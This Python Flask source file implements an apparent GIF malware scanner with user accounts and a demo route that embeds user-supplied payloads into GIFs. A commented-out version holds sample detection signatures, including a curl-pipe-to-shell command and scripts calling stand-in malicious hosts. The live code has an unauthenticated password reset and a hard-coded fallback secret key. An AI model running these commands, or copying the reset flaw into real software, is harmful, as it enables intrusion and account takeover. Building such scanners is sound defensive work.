# from flask import Flask, render_template, request, redirect, url_for
# import os
# import shutil
# from test_model import predict_gif

# app = Flask(__name__)
# UPLOAD_FOLDER = "uploads"
# STATIC_FOLDER = "static"
# app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

# os.makedirs(UPLOAD_FOLDER, exist_ok=True)
# os.makedirs(STATIC_FOLDER, exist_ok=True)

# @app.route("/", methods=["GET", "POST"])
# def index():
#     if request.method == "POST":
#         if "gif_file" not in request.files:
#             return redirect(request.url)
#         file = request.files["gif_file"]
#         if file.filename == "":
#             return redirect(request.url)
#         if file:
#             file_path = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
#             file.save(file_path)

#             # Copy to static/preview.gif for browser viewing
#             shutil.copy(file_path, os.path.join(STATIC_FOLDER, "preview.gif"))

#             label, method = predict_gif(file_path)
#             return render_template("index.html", result=(label, method), file_name=file.filename)
#     return render_template("index.html")

# if __name__ == "__main__":
#     app.run(debug=True)

# from flask import Flask, render_template, request, url_for
# import os
# from werkzeug.utils import secure_filename
# import base64

# app = Flask(__name__)
# app.config['UPLOAD_FOLDER'] = os.path.join('static', 'uploads')
# os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# infection_methods = {
#     "append_shell": "curl http://malicious.site | sh",
#     "append_js": "<script>fetch('http://xss.com')</script>",
#     "append_php": "<?php system('ls'); ?>",
#     "append_base64": "base64: Y3VybCBodHRwOi8vbWFsd2FyZS5zaA==",
#     "append_html": "<!--<div onclick='fetch(\"http://stealth\")'></div>-->",
#     "metadata_comment": "GIF infected: fetch evil.sh"
# }

# scan_history = []

# def detect_payload(content: bytes):
#     content_str = content.decode(errors='ignore')
#     for method, payload in infection_methods.items():
#         if payload in content_str:
#             extracted = payload
#             if "base64:" in payload:
#                 b64_part = payload.split("base64:")[1].strip()
#                 try:
#                     decoded = base64.b64decode(b64_part).decode()
#                     extracted += f"\nDecoded base64: {decoded}"
#                 except Exception:
#                     extracted += "\n[Failed to decode base64]"
#             return ("infected", method, extracted)
#     return ("clean", "none", "No malicious code found")

# @app.route("/", methods=["GET", "POST"])
# def index():
#     result = None
#     file_name = None
#     extracted_payload = None

#     if request.method == "POST":
#         file = request.files.get("gif_file")
#         if file and file.filename.endswith(".gif"):
#             filename = secure_filename(file.filename)
#             file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
#             file.save(file_path)

#             with open(file_path, "rb") as f:
#                 content = f.read()
#                 result = detect_payload(content)
#                 file_name = filename
#                 extracted_payload = result[2]

#             scan_history.insert(0, {
#                 "file_name": file_name,
#                 "status": result[0],
#                 "method": result[1],
#                 "payload": extracted_payload
#             })

#     return render_template(
#         "index.html",
#         result=result,
#         file_name=file_name,
#         payload=extracted_payload,
#         history=scan_history
#     )

# if __name__ == "__main__":
#     app.run(host="0.0.0.0", port=5000, debug=True)

##########################################################################################################


from flask import Flask, render_template, request, redirect, url_for, session, flash, send_file, jsonify
import os, sqlite3
import csv
import hashlib
from datetime import datetime, timedelta
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.exceptions import RequestEntityTooLarge
from test_model import predict_gif
from embedding_engine import embed_payload, get_llm_explanation
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET_KEY", "super-secret-key-change-in-production")
app.config['UPLOAD_FOLDER'] = os.path.join('static', 'uploads')
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max file size
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 3600  # Cache static files for 1 hour

# Ensure directories exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(os.path.join(app.config['UPLOAD_FOLDER'], 'embedded'), exist_ok=True)

# === Auth DB Setup ===
def init_db():
    """Initialize database with proper connection settings for performance"""
    with sqlite3.connect("users.db", timeout=10.0) as conn:
        # Enable WAL mode for better concurrency
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA synchronous=NORMAL")
        conn.execute("PRAGMA cache_size=10000")
        conn.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT
        )''')
        # Create index for faster lookups
        conn.execute('''CREATE INDEX IF NOT EXISTS idx_username ON users(username)''')
        conn.commit()
init_db()

# Limit scan history to prevent memory issues (keep last 100 scans)
MAX_SCAN_HISTORY = 100
scan_history = []

def cleanup_old_files():
    """Remove files older than 24 hours from uploads folder to prevent disk space issues"""
    try:
        upload_dir = app.config['UPLOAD_FOLDER']
        embedded_dir = os.path.join(upload_dir, 'embedded')
        cutoff_time = datetime.now() - timedelta(hours=24)
        
        for directory in [upload_dir, embedded_dir]:
            if not os.path.exists(directory):
                continue
            for filename in os.listdir(directory):
                filepath = os.path.join(directory, filename)
                if os.path.isfile(filepath) and not filename.endswith('.db'):
                    try:
                        file_time = datetime.fromtimestamp(os.path.getmtime(filepath))
                        if file_time < cutoff_time:
                            os.remove(filepath)
                    except (OSError, PermissionError):
                        pass  # Ignore errors during cleanup
    except Exception:
        pass  # Don't fail if cleanup fails

# === Routes ===
@app.route("/")
def home():
    if 'username' not in session:
        return redirect(url_for('login'))
    return redirect(url_for("index"))

@app.route("/about")
def about():
    return render_template("about.html")

# === LOGIN ===
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        try:
            user = request.form.get("username", "").strip()
            pwd = request.form.get("password", "")
            
            if not user or not pwd:
                flash("Please provide both username and password", "danger")
                return render_template("login.html")
            
            with sqlite3.connect("users.db", timeout=10.0) as conn:
                cur = conn.cursor()
                cur.execute("SELECT password FROM users WHERE username=?", (user,))
                row = cur.fetchone()
                if row and check_password_hash(row[0], pwd):
                    session['username'] = user
                    return redirect(url_for("index"))
                flash("Invalid credentials", "danger")
        except Exception as e:
            flash("An error occurred during login", "danger")
    return render_template("login.html")

# === SIGNUP ===
@app.route("/signup", methods=["GET", "POST"])
def signup():
    if request.method == "POST":
        try:
            user = request.form.get("username", "").strip()
            pwd = request.form.get("password", "")
            
            if not user or not pwd:
                flash("Please provide both username and password", "danger")
                return render_template("signup.html")
            
            if len(user) < 3 or len(user) > 50:
                flash("Username must be between 3 and 50 characters", "danger")
                return render_template("signup.html")
            
            if len(pwd) < 6:
                flash("Password must be at least 6 characters", "danger")
                return render_template("signup.html")
            
            hashed_pwd = generate_password_hash(pwd)
            with sqlite3.connect("users.db", timeout=10.0) as conn:
                try:
                    conn.execute("INSERT INTO users (username, password) VALUES (?, ?)", (user, hashed_pwd))
                    conn.commit()
                    flash("Signup successful. Please log in.", "success")
                    return redirect(url_for("login"))
                except sqlite3.IntegrityError:
                    flash("Username already exists!", "danger")
        except Exception as e:
            flash("An error occurred during signup", "danger")
    return render_template("signup.html")

# === LOGOUT ===
@app.route("/logout")
def logout():
    session.pop("username", None)
    flash("Logged out successfully.", "info")
    return redirect(url_for("login"))

@app.route("/download_report")
def download_report():
    if 'username' not in session:
        return redirect(url_for('login'))
        
    if not scan_history:
        flash("No scan history to export!", "warning")
        return redirect(url_for("index"))
    
    try:
        csv_path = os.path.join(app.config['UPLOAD_FOLDER'], f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv")
        
        # Use UTF-8 encoding with BOM for Excel compatibility, handle encoding errors
        with open(csv_path, mode='w', newline='', encoding='utf-8-sig', errors='replace') as file:
            writer = csv.writer(file)
            writer.writerow(["File Name", "Status", "Detection Method", "Model Type", "Timestamp", "Extracted Payload"])
            for entry in scan_history[:MAX_SCAN_HISTORY]:  # Limit export size
                # Clean and encode payload to handle special characters
                payload = entry.get("payload", "")
                if payload:
                    # Truncate very long payloads
                    if len(payload) > 1000:
                        payload = payload[:1000] + "... [truncated]"
                    # Replace problematic characters that can't be encoded
                    payload = str(payload).encode('utf-8', errors='replace').decode('utf-8', errors='replace')
                writer.writerow([
                    entry.get("file_name", ""),
                    entry.get("status", ""),
                    entry.get("method", ""),
                    entry.get("model_type", ""),
                    entry.get("timestamp", ""),
                    payload
                ])
        
        return send_file(csv_path, as_attachment=True, mimetype='text/csv; charset=utf-8', download_name='scan_report.csv')
    except Exception as e:
        flash(f"Error generating report: {str(e)}", "danger")
        return redirect(url_for("index"))

# === FORGOT PASSWORD ===
@app.route("/forgot_password", methods=["GET", "POST"])
def forgot_password():
    if request.method == "POST":
        username = request.form.get("username")
        new_password = request.form.get("new_password")
        confirm_password = request.form.get("confirm_password")

        if new_password != confirm_password:
            flash("Passwords do not match!", "danger")
            return redirect(url_for("forgot_password"))

        with sqlite3.connect("users.db") as conn:
            cur = conn.cursor()
            cur.execute("SELECT * FROM users WHERE username=?", (username,))
            if not cur.fetchone():
                flash("Username not found!", "danger")
                return redirect(url_for("forgot_password"))

            hashed_pwd = generate_password_hash(new_password)
            cur.execute("UPDATE users SET password=? WHERE username=?", (hashed_pwd, username))
            conn.commit()
            flash("Password updated successfully! Please login.", "success")
            return redirect(url_for("login"))

    return render_template("forgot_password.html")

# === SCAN / INDEX ===
@app.route("/scan", methods=["GET", "POST"])
def index():
    if 'username' not in session:
        return redirect(url_for('login'))

    result = None
    file_name = None
    extracted_payload = None

    if request.method == "POST":
        try:
            file = request.files.get("gif_file")
            model_type = request.form.get("model_type", "cnn")
            
            if not file:
                flash("No file provided", "danger")
                return redirect(url_for("index"))
            
            # Validate file
            if not file.filename or not file.filename.lower().endswith(".gif"):
                flash("Please upload a valid GIF file", "danger")
                return redirect(url_for("index"))
            
            # Check file size (before saving)
            file.seek(0, os.SEEK_END)
            file_size = file.tell()
            file.seek(0)
            
            if file_size > app.config['MAX_CONTENT_LENGTH']:
                flash(f"File too large. Maximum size is {app.config['MAX_CONTENT_LENGTH'] // (1024*1024)}MB", "danger")
                return redirect(url_for("index"))
            
            if file_size == 0:
                flash("File is empty", "danger")
                return redirect(url_for("index"))
            
            # Generate unique filename to prevent conflicts
            original_filename = secure_filename(file.filename)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{timestamp}_{original_filename}"
            file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            
            try:
                file.save(file_path)
                
                # Get API key from environment if using advanced analysis model
                gemini_api_key = os.getenv("GEMINI_API_KEY") if model_type == "llm" else None
                prediction = predict_gif(file_path, model_type=model_type, gemini_api_key=gemini_api_key)
                
                result = (
                    prediction.get("prediction", "error"),
                    prediction.get("model_method", "unknown"),
                    prediction.get("payload_detected", "none"),
                    model_type
                )
                file_name = filename
                extracted_payload = prediction.get("extracted_payload", "")

                # Add to scan history (limit size)
                scan_history.insert(0, {
                    "file_name": original_filename,  # Show original name
                    "status": result[0],
                    "method": result[1],
                    "payload": extracted_payload[:500] if extracted_payload else "",  # Limit payload size
                    "model_type": model_type,
                    "timestamp": datetime.now().isoformat()
                })
                
                # Limit history size
                if len(scan_history) > MAX_SCAN_HISTORY:
                    scan_history.pop()
                
            except Exception as e:
                flash(f"Error processing file: {str(e)}", "danger")
                # Clean up file on error
                if os.path.exists(file_path):
                    try:
                        os.remove(file_path)
                    except Exception:
                        pass
                return redirect(url_for("index"))
                
        except RequestEntityTooLarge:
            flash("File too large. Maximum size is 50MB", "danger")
            return redirect(url_for("index"))
        except Exception as e:
            flash(f"Unexpected error: {str(e)}", "danger")
            return redirect(url_for("index"))
    
    # Cleanup old files periodically (every 10th request)
    if len(scan_history) % 10 == 0:
        cleanup_old_files()

    return render_template(
        "index.html",
        result=result,
        file_name=file_name,
        payload=extracted_payload,
        history=scan_history[:50],  # Only show last 50 in UI
        username=session.get('username')
    )

# === EMBEDDING / STEGANOGRAPHY DEMONSTRATION ===
@app.route("/embed", methods=["GET", "POST"])
def embed_demo():
    if 'username' not in session:
        return redirect(url_for('login'))
    
    result = None
    error = None
    llm_explanation = None
    
    if request.method == "POST":
        try:
            gif_file = request.files.get("gif_file")
            payload_text = request.form.get("payload_text", "").strip()
            embedding_method = request.form.get("embedding_method", "append")
            
            # Validate inputs
            if not gif_file or not gif_file.filename:
                error = "Please upload a valid GIF file."
            elif not gif_file.filename.lower().endswith(".gif"):
                error = "Please upload a valid GIF file (.gif extension required)."
            elif not payload_text or len(payload_text) == 0:
                error = "Please provide a payload to embed."
            elif len(payload_text) > 10000:  # Limit payload size
                error = "Payload too large. Maximum 10,000 characters."
            else:
                # Check file size
                gif_file.seek(0, os.SEEK_END)
                file_size = gif_file.tell()
                gif_file.seek(0)
                
                if file_size > app.config['MAX_CONTENT_LENGTH']:
                    error = f"File too large. Maximum size is {app.config['MAX_CONTENT_LENGTH'] // (1024*1024)}MB"
                elif file_size == 0:
                    error = "File is empty"
                else:
                    # Generate unique filename
                    original_filename = secure_filename(gif_file.filename)
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    gif_filename = f"{timestamp}_{original_filename}"
                    gif_path = os.path.join(app.config['UPLOAD_FOLDER'], gif_filename)
                    
                    try:
                        gif_file.save(gif_path)
                        
                        # Embed payload
                        embedding_result = embed_payload(gif_path, payload_text, method=embedding_method)
                        
                        # Get LLM explanation (non-blocking, with timeout handling)
                        try:
                            gemini_api_key = os.getenv("GEMINI_API_KEY")
                            llm_explanation = get_llm_explanation(
                                embedding_result['method'],
                                payload_text,
                                embedding_result['details']
                            )
                        except Exception as llm_error:
                            # Don't fail if LLM explanation fails
                            llm_explanation = f"LLM explanation unavailable: {str(llm_error)}"
                        
                        # Prepare result
                        embedded_filename = os.path.basename(embedding_result['output_path'])
                        result = {
                            'success': True,
                            'original_file': gif_filename,
                            'embedded_file': embedded_filename,
                            'method': embedding_result['method'],
                            'details': embedding_result['details'],
                            'original_size': embedding_result.get('original_size', 0),
                            'embedded_size': embedding_result.get('embedded_size', 0),
                            'payload_preview': payload_text[:200] + "..." if len(payload_text) > 200 else payload_text
                        }
                        
                    except Exception as e:
                        error = f"Error during embedding: {str(e)}"
                        # Clean up on error
                        if os.path.exists(gif_path):
                            try:
                                os.remove(gif_path)
                            except Exception:
                                pass
                                
        except RequestEntityTooLarge:
            error = "File too large. Maximum size is 50MB"
        except Exception as e:
            error = f"Unexpected error: {str(e)}"
    
    return render_template(
        "embed.html",
        result=result,
        error=error,
        llm_explanation=llm_explanation,
        username=session.get('username')
    )

# === EMBEDDING METHODS INFORMATION PAGE ===
@app.route("/embedding-info")
def embedding_info():
    """Professional information page about embedding methods"""
    return render_template("embedding_info.html", username=session.get('username'))

# Error handlers
@app.errorhandler(413)
@app.errorhandler(RequestEntityTooLarge)
def request_entity_too_large(error):
    flash("File too large. Maximum size is 50MB", "danger")
    return redirect(request.url if request.method == 'GET' else url_for('index')), 413

@app.errorhandler(404)
def not_found(error):
    flash("Page not found", "warning")
    return redirect(url_for('home')), 404

@app.errorhandler(500)
def internal_error(error):
    flash("An internal error occurred. Please try again.", "danger")
    return redirect(url_for('index')), 500

# Cleanup on startup
cleanup_old_files()

if __name__ == "__main__":
    # Production settings
    app.run(
        host="0.0.0.0", 
        port=5000, 
        debug=False,  # Set to False in production
        threaded=True  # Enable threading for better performance
    )
